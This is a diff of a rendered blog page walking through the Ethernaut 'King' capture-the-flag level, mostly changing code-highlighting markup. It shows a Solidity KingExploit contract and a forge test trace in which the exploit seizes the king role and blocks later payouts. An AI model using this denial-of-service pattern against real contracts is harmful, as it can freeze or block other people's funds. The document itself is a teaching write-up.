-</span></span><span style="display:flex;"><span>    │   │   ├─ [838] King::fallback()
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [167] KingExploit::fallback()
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#0ff;font-weight:bold">&#34;muhahaha&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#0ff;font-weight:bold">&#34;muhahaha&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   ├─ [287] King::_king() [staticcall]
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← KingExploit: [...]
-</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [...], level: KingFactory: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    └─ ← ()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#ff0;font-weight:bold">1</span> passed; <span style="color:#ff0;font-weight:bold">0</span> failed; finished in 1.09ms
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ forge <span class="nb">test</span> --match-contract KingTest -vvvv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running <span class="m">1</span> <span class="nb">test</span> <span class="k">for</span> src/test/King.t.sol:KingTest
+</span></span><span class="line"><span class="cl"><span class="o">[</span>PASS<span class="o">]</span> testKing<span class="o">()</span> <span class="o">(</span>gas: 431179<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Traces:
+</span></span><span class="line"><span class="cl">  <span class="o">[</span>431179<span class="o">]</span> KingTest::testKing<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>215833<span class="o">]</span> KingTest::create<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>0<span class="o">]</span> VM::prank<span class="o">(</span>player: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>203485<span class="o">]</span> Ethernaut::createLevelInstance<span class="o">(</span>KingFactory: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ <span class="o">[</span>151922<span class="o">]</span> KingFactory::createInstance<span class="o">(</span>player: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   │   ├─ <span class="o">[</span>119381<span class="o">]</span> → new King@<span class="s2">&#34;0x037f…dd8f&#34;</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   └─ ← <span class="m">364</span> bytes of code
+</span></span><span class="line"><span class="cl">    │   │   │   └─ ← King: <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ emit LevelInstanceCreatedLog<span class="o">(</span>player: player: <span class="o">[</span>...<span class="o">]</span>, instance: King: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← King: <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← King: <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>287<span class="o">]</span> King::_king<span class="o">()</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← KingFactory: <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>317<span class="o">]</span> King::prize<span class="o">()</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::startPrank<span class="o">(</span>player: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>86666<span class="o">]</span> → new KingExploit@<span class="s2">&#34;0xa2f9…f3a7&#34;</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="m">321</span> bytes of code
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>34652<span class="o">]</span> KingExploit::run<span class="o">{</span>value: 1<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>27516<span class="o">]</span> King::fallback<span class="o">{</span>value: 1<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ <span class="o">[</span>55<span class="o">]</span> KingFactory::fallback<span class="o">{</span>value: 1<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::stopPrank<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::startPrank<span class="o">(</span>player: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>5470<span class="o">]</span> Ethernaut::submitLevelInstance<span class="o">(</span>King: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>2423<span class="o">]</span> KingFactory::validateInstance<span class="o">(</span>King: <span class="o">[</span>...<span class="o">]</span>, player: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ <span class="o">[</span>838<span class="o">]</span> King::fallback<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   ├─ <span class="o">[</span>167<span class="o">]</span> KingExploit::fallback<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   └─ ← <span class="s2">&#34;muhahaha&#34;</span>
+</span></span><span class="line"><span class="cl">    │   │   │   └─ ← <span class="s2">&#34;muhahaha&#34;</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ <span class="o">[</span>287<span class="o">]</span> King::_king<span class="o">()</span> <span class="o">[</span>staticcall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   │   │   └─ ← KingExploit: <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    │   ├─ emit LevelCompletedLog<span class="o">(</span>player: player: <span class="o">[</span>...<span class="o">]</span>, level: KingFactory: <span class="o">[</span>...<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::stopPrank<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Test result: ok. <span class="m">1</span> passed<span class="p">;</span> <span class="m">0</span> failed<span class="p">;</span> finished in 1.09ms
 </span></span></code></pre></div><p>Let&rsquo;s try omitting the <code>receive</code> and <code>fallback</code> functions:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> KingExploit {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run(<span style="color:#fff;font-weight:bold">address</span> _king) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        (<span style="color:#fff;font-weight:bold">bool</span> success, ) = <span style="color:#fff;font-weight:bold">payable</span>(_king).<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(success, <span style="color:#0ff;font-weight:bold">&#34;failed to send ether&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">KingExploit</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">(</span><span class="kt">address</span> <span class="n">_king</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="n">_king</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;failed to send ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Actually, we don&rsquo;t need to send any Ether because the initial
 <code>prize</code> is <code>0</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> exploit() <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">override</span> {
-</span></span><span style="display:flex;"><span>    vm.startPrank(player);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    KingExploit expl = <span style="color:#fff;font-weight:bold">new</span> KingExploit();
-</span></span><span style="display:flex;"><span>    (<span style="color:#fff;font-weight:bold">new</span> KingExploit()).run(<span style="color:#fff;font-weight:bold">address</span>(level));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="k">internal</span> <span class="k">override</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">KingExploit</span> <span class="n">expl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">KingExploit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">new</span> <span class="n">KingExploit</span><span class="p">()).</span><span class="n">run</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This works too 😜</p>
 <h2 id="lessons-learned">
   Lessons learned
@@ -495,7 +495,7 @@ Let&rsquo;s move on to <a href="https://vyorkin.org/posts/ctf-walkthrough-ethern
     
       1985 -
     
-    2025
+    2026
      Vasiliy Yorkin 
     
   </section>
@@ -511,6 +511,11 @@ Let&rsquo;s move on to <a href="https://vyorkin.org/posts/ctf-walkthrough-ethern
   
 
   
+  
+  
+  <script src="https://vyorkin.org/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="></script>
+  
+  
 
   
 
@@ -519,7 +524,7 @@ Let&rsquo;s move on to <a href="https://vyorkin.org/posts/ctf-walkthrough-ethern
       <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
       <script>
         var doNotTrack = false;
-        if ( false ) {
+        if ( true ) {
           var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
           var doNotTrack = (dnt == "1" || dnt == "yes");
         }
